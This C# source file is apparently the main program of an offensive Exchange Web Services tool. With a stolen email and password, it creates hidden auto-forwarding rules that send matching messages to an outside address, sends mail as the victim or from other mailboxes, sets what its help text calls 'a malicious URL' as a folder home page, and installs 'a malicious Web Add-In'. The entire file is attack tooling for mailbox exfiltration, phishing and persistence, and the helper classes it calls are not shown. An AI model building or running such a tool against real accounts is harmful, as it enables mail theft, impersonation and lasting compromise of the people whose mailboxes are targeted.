using System;
using System.Linq;
using NDesk.Options;
using System.Collections.Generic;
using Microsoft.Exchange.WebServices.Data;


namespace EWS
{
    public class Program
    {

        private static List<string> CreateList(string strings)
        {
            List<string> List = new List<string>();

            string[] str = strings.Split(',');
            foreach(string s in str)
            {
                List.Add(s);
            }

            return List;

        }

        public static void Main(string[] args)
        {
            // global
            string email = null;
            string password = null;
            bool help = false;

            // rules
            bool rule = false;
            string ruleName = null;
            List<string> subjectStrings = new List<string>();
            List<string> bodyStrings = new List<string>();
            string forwardAddress = null;

            // send mail
            bool sendmail = false;
            List<string> recipients = new List<string>();
            string subject = null;
            string template = null;
            string format = null;
            string attachement = null;
            string from = null;

            // home folder
            bool homefolder = false;
            string url = null;

            // installapp
            bool installapp = false;
            string manifest = null;

            var options = new OptionSet()
            {
                // global 
                { "E|Email=", "Email address to authenticate with", v => email = v },
                { "P|Password=", "Password to authenticate with", v => password = v },
                // rule
                { "rule", "Set auto-forwarding rules on users' mailbox", v => rule = true },
                { "N|Name=", "Set a name for the rule", v => ruleName = v },
                { "s|subject=", "Trigger on these strings in the mail Subject", v => subjectStrings = CreateList(v) },
                { "b|body=", "Trigger on these strings in the mail Body", v => bodyStrings = CreateList(v) },
                { "F|Forward=", "Email address to receive forwarded emails at", v => forwardAddress = v },
                // sendmail
                { "sendmail", "Send an email an behalf of the current user", v => sendmail = true},
                { "R|Recipients=", "Send email to", v => recipients = CreateList(v)},
                { "S|Subject=", "Email subject", v => subject = v},
                { "T|Template=", "Email template file", v => template = v},
                { "t|plaintext", "Send email as plaintext, not HTML", v => format = "txt" },
                { "a|attachment=", "Send an attachement", v => attachement = v },
                { "f|from=", "Send email from this account / mailbox", v => from = v },
                // homefolder
                { "homefolder", "Set a malicious URL on a folder", v => homefolder = true },
                { "U|Url=", "URL to configure", v => url = v },
                // installapp
                { "installapp", "Install a malicious Web Add-In", v => installapp = true },
                { "M|Manifest=", "Manifest to install", v => manifest = v },
                { "h|?|help", "Show this help", v => help = true }
            };

            try
            {
                options.Parse(args);
            }
            catch (OptionException ex)
            {
                Console.WriteLine(ex);
            }

            Logo.Print();

            if (args.Length == 0 || help)
            {
                Console.WriteLine();
                Console.WriteLine("  Options:");
                options.WriteOptionDescriptions(Console.Out);
                Console.WriteLine();
                Console.WriteLine("  Uppercase parameters are mandatory for their respective functions.");
                Console.WriteLine();
                Help.ShowExamples();
                return;
            }

            if (rule)
            {
                if (ruleName == null)
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] Name required");
                    return;
                }

                if (!subjectStrings.Any() && !bodyStrings.Any())
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] Subject or Body strings required");
                    return;
                }

                if (forwardAddress == null)
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] Forward address required");
                    return;
                }

                ExchangeService service = Exchange.NewExchangeService(email, password);
                Rules.AddNewRule(service, ruleName, subjectStrings, bodyStrings, forwardAddress);

            }

            if (sendmail)
            {
                if (!recipients.Any())
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] Recipient email address(es) required");
                    return;
                }

                ExchangeService service = Exchange.NewExchangeService(email, password);
                Email.Send(service, recipients, subject, format, template, attachement, from);

            }

            if (homefolder)
            {
                if (url == null)
                {
                    Console.WriteLine();
                    Console.WriteLine(" [x] URL required");
                    return;
                }

                try
                {
                    ExchangeService service = Exchange.NewExchangeService(email, password);
                    HomeFolder.AddHomeFolderURL(service, url);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }

            if (installapp)
            {
                Console.WriteLine();
                Console.WriteLine(" [>] Installing Application Manifest");

                if (manifest == null)
                {
                    Console.WriteLine(" [x] Manifest Required");
                    return;
                }

                try
                {
                    ExchangeService service = Exchange.NewExchangeService(email, password);
                    InstallApp.InstallNewApp(service, manifest);                    
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }
            }

        }
    }
}